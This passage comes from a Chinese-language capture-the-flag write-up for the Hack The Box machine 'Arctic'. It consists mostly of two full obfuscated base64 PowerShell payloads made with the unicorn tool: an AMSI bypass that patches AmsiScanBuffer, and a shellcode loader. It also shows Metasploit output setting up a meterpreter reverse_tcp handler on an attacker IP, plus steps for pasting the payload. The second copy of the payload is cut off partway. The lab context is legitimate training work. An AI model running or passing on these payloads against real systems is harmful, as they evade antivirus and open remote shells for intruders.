powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABWAGUAbABqAG4AIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlACIAKwAiAHIAIgArACIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAkAFYAZQBsAGoAbgA7ACQAbQBFAE4AYQBiAGkAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZAAiACsAIgBsACIAKwAiAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAZgBmACIAKwAiAGUAIgArACIAcgAiACkAOwAkAE8AbQBSAGMAaQBpAHUAUwBlAFUAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQBFAE4AYQBiAGkALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQATwBtAFIAYwBpAGkAdQBTAGUAVQApADsAJABIAFUAQQBRAFQAVABrACAAPQAgACgAIgB9AHgAZgBaAGYAeABsAHUAUgAsACAAfQB4AGkAagBYAGgASwB0AE8ALAAgAH0AeAB9AH0ALAAgAH0AeAB9ADcALAAgAH0AeAA4AH0ALAAgAH0AeABDADMAIgApAC4AcgBlAHAAbABhAGMAZQAoACIAaQBqAFgAaABLAHQATwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBmAFoAZgB4AGwAdQBSACIALAAgACIAQgA4ACIAKQA7ACQASABVAEEAUQBUAFQAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAEgAVQBBAFEAVABUAGsAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABIAFUAQQBRAFQAVABrACwAIAAwACwAIAAkAG0ARQBOAGEAYgBpACwAIAA2ACkA&#39;)&quot;

# actual unicorn payload
powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;)&quot;
</code></pre>
<p>一个是 powershell 的攻击代码</p>
<p>我们复制进去</p>
<p>然后我们使用 msfconsole 加载 unicorn.rc</p>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# msfconsole -r unicorn.rc 


                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      &#39;7$$$$\&quot;&quot;&quot;&quot;&#39;&#39;^^`` .7$$$|D*&quot;&#39;```         ?88&#39;
  d8bd8b.d8p d8888b ?88&#39; d888b8b            _.os#$|8*&quot;`   d8P       ?8b  88P
  88P`?P&#39;?P d8b_,dP 88P d8P&#39; ?88       .oaS###S*&quot;`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*&quot; ?88,.d88b, d88 d8P&#39; ?88 88P `?8b
d88&#39; d88b 8b`?8888P&#39;`?8b`?88P&#39;.aS$$$$Q*&quot;`    `?88&#39;  ?88 ?88 88b  d88 d88
                          .a#$$$$$$&quot;`          88b  d8P  88b`?8888P&#39;
                       ,s$$$$$$$&quot;`             888888P&#39;   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P&#39;    .,.ass%#S$$$$$$$$$$$$$$&#39;
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#39;
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS&#39;
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&quot;&quot;&#39;&#39;^^/$$$$$$&#39;
_______________________________________________________________   ,&amp;$$$$$$&#39;_____
                                                                 ll&amp;&amp;$$$$&#39;
                                                              .;;lll&amp;&amp;&amp;&amp;&#39;
                                                            ...;;lllll&amp;&#39;
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .

       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again

[*] Processing unicorn.rc for ERB directives.
resource (unicorn.rc)&gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (unicorn.rc)&gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
resource (unicorn.rc)&gt; set LHOST 10.10.16.4
LHOST =&gt; 10.10.16.4
resource (unicorn.rc)&gt; set LPORT 5555
LPORT =&gt; 5555
resource (unicorn.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (unicorn.rc)&gt; set AutoVerifySession false
AutoVerifySession =&gt; false
resource (unicorn.rc)&gt; set AutoSystemInfo false
AutoSystemInfo =&gt; false
resource (unicorn.rc)&gt; set AutoLoadStdapi false
AutoLoadStdapi =&gt; false
resource (unicorn.rc)&gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.4:5555
</code></pre>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# cat powershell_attack.txt|xclip
</code></pre>
<p>把 poweshell 的攻击脚本复制到剪切板</p>
<pre><code class="bash">powershell /w 1 /C &quot;
</code></pre>
<p>删掉前面的内容和最后的双引号</p>
<pre><code class="bash">sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgA